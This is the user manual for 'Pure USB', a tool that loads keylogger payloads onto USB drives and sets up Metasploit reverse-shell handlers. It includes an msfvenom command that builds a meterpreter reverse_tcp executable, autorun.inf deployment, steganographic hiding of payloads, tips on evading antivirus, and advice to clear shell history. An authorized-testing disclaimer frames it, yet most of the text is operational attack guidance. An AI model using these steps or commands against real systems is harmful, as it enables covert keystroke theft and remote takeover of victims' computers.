# Pure USB - User Manual

**Version 1.0**  
**Keylogger Payload Deployment Tool**

---

## ⚠️ LEGAL DISCLAIMER

**FOR AUTHORIZED TESTING ONLY**

Pure USB is designed for authorized penetration testing, security research, and educational purposes only. You must:

- Only use on systems you own or have explicit written permission to test
- Follow all applicable laws and regulations
- Respect privacy and confidentiality
- Clean up after testing activities
- Document all testing activities properly

**Unauthorized use is illegal and unethical.**

---

## Table of Contents

1. [Overview](#overview)
2. [Installation](#installation)
3. [Getting Started](#getting-started)
4. [Features Overview](#features-overview)
5. [Tab-by-Tab Guide](#tab-by-tab-guide)
6. [Common Workflows](#common-workflows)
7. [Troubleshooting](#troubleshooting)
8. [Advanced Usage](#advanced-usage)
9. [Best Practices](#best-practices)
10. [FAQ](#faq)

---

## Overview

Pure USB is a comprehensive GUI application for managing and deploying keylogger payloads to USB drives. It provides a user-friendly interface for:

- **Payload Management**: View, organize, and generate keylogger payloads
- **USB Deployment**: Automated deployment of payloads to USB drives
- **Handler Management**: Configure and manage Metasploit handlers
- **Advanced Features**: Steganography, encryption, and evasion techniques
- **Cross-Platform Support**: Works with Windows, Linux, and Python payloads

### Key Features

✅ **5-Tab Interface**: Organized workflow with dedicated tabs  
✅ **Auto USB Detection**: Real-time USB device scanning  
✅ **Smart Deployment**: Organized directory structure creation  
✅ **Handler Automation**: One-click Metasploit handler setup  
✅ **Payload Details**: Comprehensive file information and analysis  
✅ **Settings Persistence**: Save and restore application preferences  
✅ **Professional UI**: Clean, intuitive interface design  

---

## Installation

### Prerequisites

- **Linux System**: Tested on Kali Linux, should work on Ubuntu/Debian
- **Python 3**: Version 3.6 or higher
- **Python Tkinter**: GUI framework (`apt install python3-tk`)
- **Metasploit Framework**: For handler functionality (optional)
- **Root Access**: For USB mounting operations

### Quick Install

1. **Download Pure USB**:
   ```bash
   # Files should be in /home/xx/keylogger_payloads/
   cd /home/xx/keylogger_payloads/
   ```

2. **Run Installer**:
   ```bash
   sudo ./install_pure_usb.sh
   ```

3. **Launch Application**:
   ```bash
   # From terminal
   pure_usb
   
   # Or from applications menu
   # System → Pure USB
   ```

### Manual Installation

1. **Make executable**:
   ```bash
   chmod +x pure_usb.py
   ```

2. **Run directly**:
   ```bash
   python3 pure_usb.py
   ```

---

## Getting Started

### First Launch

1. **Start Pure USB** from Applications menu or terminal
2. **Check USB Devices** in the USB Deploy tab
3. **Review Payloads** in the Payloads tab
4. **Configure Settings** in the Settings tab

### Quick Deployment (3 Steps)

1. **Select Payloads**: Choose payloads in the Payloads tab
2. **Choose USB Drive**: Select target USB device in USB Deploy tab
3. **Deploy**: Click "Deploy to USB" button

### Basic Handler Setup

1. **Go to Handlers Tab**
2. **Click "Auto-detect"** to set your IP address
3. **Click "Start All Handlers"** to launch Metasploit

---

## Features Overview

### Core Components

| Component | Purpose |
|-----------|---------|
| **Payloads Tab** | Manage and view payload files |
| **USB Deploy Tab** | Deploy payloads to USB drives |
| **Handlers Tab** | Configure Metasploit handlers |
| **Advanced Tab** | Steganography and encryption |
| **Settings Tab** | Application configuration |

### Supported File Types

| Extension | Description | Platform |
|-----------|-------------|----------|
| `.exe` | Windows Executables | Windows |
| `.py` | Python Scripts | Cross-platform |
| `.ps1` | PowerShell Scripts | Windows |
| `.rc` | Metasploit Resources | Any |
| `.sh` | Shell Scripts | Linux/Mac |
| `.bat` | Batch Files | Windows |

---

## Tab-by-Tab Guide

### 1. Payloads Tab

**Purpose**: Manage your keylogger payload collection

**Key Features**:
- **Multi-select**: Choose multiple payloads for deployment
- **File Details**: Size, type, modification date
- **Content Preview**: View payload information
- **Generation**: Create new payloads (planned feature)

**Usage**:
1. View available payloads in the list
2. Select one or more payloads
3. View details in the information panel
4. Use "View Details" for comprehensive file analysis

**Buttons**:
- **Refresh**: Rescan payload directory
- **Generate New**: Open payload generator dialog
- **View Details**: Show detailed file information

### 2. USB Deploy Tab

**Purpose**: Deploy selected payloads to USB drives

**Key Features**:
- **Auto USB Detection**: Real-time device scanning
- **Mount/Unmount**: Manual USB device management
- **Deployment Options**: Customizable deployment settings
- **Progress Tracking**: Visual feedback during deployment

**Deployment Options**:
- ✅ **Organized Structure**: Create `payloads/`, `documentation/`, `launchers/` folders
- ✅ **Include Launchers**: Copy autorun.bat and run_payload.sh
- ✅ **Create Autorun**: Generate Windows autorun.inf file

**Usage**:
1. Insert USB drive (auto-detected)
2. Select USB device from list
3. Configure deployment options
4. Click "Deploy to USB"

### 3. Handlers Tab

**Purpose**: Manage Metasploit handlers for payload connections

**Key Features**:
- **IP Auto-detection**: Automatically detect local IP
- **Handler Configuration**: Set LHOST for connections
- **Multi-handler Setup**: Launch all handlers with one click
- **Status Tracking**: Monitor handler status

**Usage**:
1. Set LHOST IP address (use Auto-detect)
2. Click "Start All Handlers" to launch Metasploit
3. Monitor handler status in the tree view
4. Use "Open MSF Console" for manual Metasploit access

**Handler Types**:
- `windows/x64/meterpreter/reverse_tcp` (Port 4444)
- `python/meterpreter/reverse_tcp` (Port 4445)
- `windows/meterpreter/reverse_https` (Port 443)
- `windows/x64/meterpreter/reverse_tcp` (Port 8080)

### 4. Advanced Tab

**Purpose**: Advanced payload manipulation and evasion

**Features**:
- **Steganography**: Hide payloads in image files
- **USB Encryption**: Encrypt USB contents
- **Custom Generation**: Create specialized payloads
- **Encoding**: Obfuscate existing payloads

**Steganography**:
1. Select cover image (.jpg, .png, .bmp)
2. Set password for payload extraction
3. Click "Create Stego Payload"
4. Use steghide to extract on target

**Note**: Some advanced features are planned for future versions.

### 5. Settings Tab

**Purpose**: Application configuration and preferences

**Settings**:
- **Payload Directory**: Set location of payload files
- **Auto-refresh USB**: Enable/disable automatic USB scanning
- **Default Options**: Set default deployment preferences

**Functions**:
- **Save Settings**: Store current configuration
- **Load Settings**: Restore saved configuration
- **Reset Defaults**: Restore factory settings

**About Section**: Application information and feature list

---

## Common Workflows

### Workflow 1: Quick USB Deployment

```
1. Launch Pure USB
2. Payloads Tab → Select payloads
3. USB Deploy Tab → Select USB drive
4. Click "Deploy to USB"
5. Wait for completion message
```

### Workflow 2: Full Testing Setup

```
1. Launch Pure USB
2. Settings Tab → Configure preferences
3. Handlers Tab → Set LHOST and start handlers
4. Payloads Tab → Select test payloads
5. USB Deploy Tab → Deploy with full options
6. Test on target system
7. Monitor connections in Metasploit
```

### Workflow 3: Steganographic Deployment

```
1. Advanced Tab → Select cover image
2. Set steganography password
3. Create hidden payload
4. Deploy stego payload to USB
5. Extract on target with steghide
```

---

## Troubleshooting

### Common Issues

#### USB Not Detected
- **Solution**: Check USB connection, try different port
- **Command**: `lsblk -f` to manually verify devices

#### Permission Denied
- **Solution**: Run with sudo for USB operations
- **Command**: `sudo python3 pure_usb.py`

#### Metasploit Not Found
- **Solution**: Install Metasploit Framework
- **Command**: `apt install metasploit-framework`

#### Python Dependencies
- **Solution**: Install required packages
- **Commands**:
  ```bash
  apt install python3-tk
  pip3 install pathlib
  ```

### Error Messages

| Error | Cause | Solution |
|-------|-------|----------|
| "Please select USB device" | No USB selected | Select device in USB Deploy tab |
| "Please select payloads" | No payloads chosen | Select files in Payloads tab |
| "Failed to mount device" | Permission/hardware issue | Check sudo access and USB health |
| "Metasploit console failed" | MSF not installed | Install metasploit-framework |

### Debug Mode

Run with debug output:
```bash
python3 -u pure_usb.py 2>&1 | tee debug.log
```

---

## Advanced Usage

### Custom Payload Generation

1. Use msfvenom to create custom payloads
2. Place in payload directory
3. Refresh payload list in Pure USB

**Example**:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f exe -o custom_payload.exe
```

### USB Encryption

1. Format USB with LUKS encryption
2. Mount encrypted partition
3. Deploy payloads to encrypted USB

**Commands**:
```bash
sudo cryptsetup luksFormat /dev/sdX1
sudo cryptsetup luksOpen /dev/sdX1 encrypted_usb
sudo mount /dev/mapper/encrypted_usb /mnt/encrypted
```

### Network Configuration

For remote handler setup:
1. Configure firewall rules
2. Set up port forwarding
3. Use VPN or tunnel connections

### Batch Operations

Deploy to multiple USB drives:
1. Insert multiple USB devices
2. Run deployment script for each device
3. Monitor progress in separate terminals

---

## Best Practices

### Security

✅ **Always encrypt sensitive payloads**  
✅ **Use unique passwords for steganography**  
✅ **Clean up test systems after use**  
✅ **Document all testing activities**  
✅ **Follow responsible disclosure practices**  

### Payload Management

✅ **Organize payloads by target/type**  
✅ **Keep payload generation commands documented**  
✅ **Test payloads in isolated environments**  
✅ **Maintain backup copies**  
✅ **Version control payload modifications**  

### USB Deployment

✅ **Use high-quality USB drives**  
✅ **Test USB autorun functionality**  
✅ **Create multiple deployment options**  
✅ **Label USBs clearly for authorized testing**  
✅ **Safely eject USBs after deployment**  

### Handler Management

✅ **Use dedicated testing networks**  
✅ **Configure proper firewall rules**  
✅ **Monitor connection logs**  
✅ **Use encrypted communication when possible**  
✅ **Close handlers when testing complete**  

---

## FAQ

### General Questions

**Q: What operating systems does Pure USB support?**  
A: Pure USB runs on Linux (tested on Kali/Ubuntu). It can deploy payloads for Windows, Linux, and cross-platform targets.

**Q: Do I need Metasploit installed?**  
A: Metasploit is optional but recommended for handler functionality. Pure USB can deploy payloads without it.

**Q: Can I use Pure USB without root access?**  
A: Some features (USB mounting) require root access. You can run the application as a regular user but may need sudo for USB operations.

### Technical Questions

**Q: How does USB auto-detection work?**  
A: Pure USB uses the `lsblk` command to scan for block devices and identifies removable storage.

**Q: Can I add custom payload types?**  
A: Yes, place any executable or script file in the payload directory and refresh the list.

**Q: What's the maximum payload size?**  
A: Limited only by USB drive capacity. Pure USB handles files from bytes to gigabytes.

**Q: Does Pure USB work with encrypted USBs?**  
A: Yes, as long as the USB is mounted and accessible to the file system.

### Usage Questions

**Q: How do I clean up after testing?**  
A: Remove payload files from target systems, clear browser/shell history, remove persistence mechanisms, and document cleanup activities.

**Q: Can I deploy to multiple USBs simultaneously?**  
A: Currently one USB at a time through the GUI. Use command-line scripts for batch operations.

**Q: What if my payload is detected by antivirus?**  
A: Use encoding, packing, or steganographic features. Consider custom payload generation techniques.

---

## Support and Updates

### Getting Help

- **Check this manual** for common solutions
- **Review error messages** carefully
- **Test in isolated environment** first
- **Document issues** with screenshots/logs

### Contributing

Pure USB is designed for security professionals. Contributions and feedback are welcome for:
- Bug fixes and improvements
- New payload types support
- Additional evasion techniques
- Documentation enhancements

### Version History

- **v1.0**: Initial release with core functionality
- **Future**: Planned features include advanced steganography, payload encoding, and batch operations

---

## Legal and Ethical Guidelines

### Authorized Testing Only

Pure USB is a professional tool designed for:
- **Penetration Testing**: With proper authorization
- **Security Research**: In controlled environments  
- **Education**: Learning ethical hacking techniques
- **Red Team Exercises**: Sanctioned security assessments

### Prohibited Uses

❌ **Unauthorized access** to systems  
❌ **Malicious activities** or criminal intent  
❌ **Privacy violations** without consent  
❌ **Corporate espionage** or data theft  
❌ **Personal attacks** or harassment  

### Legal Compliance

Always ensure compliance with:
- Local and federal computer crime laws
- Organizational policies and procedures
- Professional ethical guidelines
- International cybersecurity frameworks

### Responsible Disclosure

If you discover vulnerabilities during authorized testing:
1. Document findings professionally
2. Report to appropriate stakeholders
3. Provide remediation recommendations
4. Follow coordinated disclosure timelines
5. Respect confidentiality agreements

---

**Pure USB User Manual v1.0**  
*For authorized security testing only*

Remember: The goal of security testing is to improve security, not to cause harm. Always use Pure USB responsibly and ethically.